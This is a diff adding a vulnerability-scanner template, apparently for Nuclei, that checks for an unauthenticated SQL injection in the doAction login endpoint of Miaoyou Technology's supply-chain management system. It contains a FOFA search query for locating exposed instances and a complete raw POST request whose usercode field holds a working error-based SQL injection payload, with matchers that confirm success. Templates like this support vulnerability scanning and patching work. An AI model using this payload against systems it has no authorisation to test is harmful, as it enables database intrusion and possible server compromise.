@@ -1,0 +1,37 @@
+id: miaoyou-doaction-sqli
+
+info:
+  name: 秒优科技-供应链管理系统doAction存在SQL注入漏洞
+  author: qwtd
+  severity: high
+  description: |
+    由于秒优科技-供应链管理系统 doAction 接口未对用户传入的参数进行合理的校验和过滤，导致传入的参数直接携带到数据库执行，导致SQL注入漏洞，未经身份验证的攻击者可通过此漏洞获取数据库权限，深入利用可获取服务器权限。
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E7%A7%92%E4%BC%98%E7%A7%91%E6%8A%80/%E7%A7%92%E4%BC%98%E7%A7%91%E6%8A%80-%E4%BE%9B%E5%BA%94%E9%93%BE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FdoAction%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    fofa: app="秒优科技-供应链管理系统"
+  tags: 秒优供应链管理系统
+
+http:
+  - raw:
+      - |
+        POST /zh/login/doAction HTTP/1.1
+        Host: {{Hostname}}
+        X-Requested-With: XMLHttpRequest
+        Accept: application/json, text/javascript, */*; q=0.01
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/json
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
+        Priority: u=0
+
+        {"usercode":"1'+(SELECT CHAR(83)+CHAR(87)+CHAR(119)+CHAR(105) WHERE 6635=6635 AND 2366 IN (SELECT (CHAR(113)+CHAR(98)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (2366=2366) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(120)+CHAR(107)+CHAR(106)+CHAR(113))))+'","password":"1","remember":false,"ip":null,"city":null,"ISERP":"ISERP"}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "qbbzq1qxkjq"
+      - type: status
+        status:
+          - 500
